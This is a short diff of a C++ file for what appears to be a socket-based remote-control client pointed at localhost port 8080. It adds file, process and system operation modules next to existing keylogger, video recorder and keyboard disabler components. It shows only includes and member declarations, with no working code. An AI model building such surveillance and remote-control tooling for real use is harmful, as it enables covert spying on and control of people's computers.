@@ -12,10 +12,13 @@
 #include <atomic>
 #pragma comment(lib, "ws2_32.lib")
 
-#include "./../WindowAPI/winAPI.hpp"
 #include "./../WindowAPI/KeyboardDisabler.hpp"
 #include "./../WindowAPI/Keylogger.hpp"
 #include "./../WindowAPI/VideoRecorder.hpp"
+#include "./../WindowAPI/FileOperations.hpp"
+#include "./../WindowAPI/ProcessOperations.hpp"
+#include "./../WindowAPI/SystemOperations.hpp"
+
 
 #define PORT 8080
 #define SERVER_IP "127.0.0.1"
@@ -61,13 +64,17 @@ private:
 
     void initializeHandlers();
 
-    WinAPI *winAPI;
-
     Keylogger *keylogger;
 
     VideoRecorder *recorder;
 
     KeyboardDisabler *keyboardDisabler;
+
+    FileOperations *fileOperations;
+
+    ProcessOperations *processOperations;
+
+    SystemOperations *systemOperations;
 
     std::string response;
 
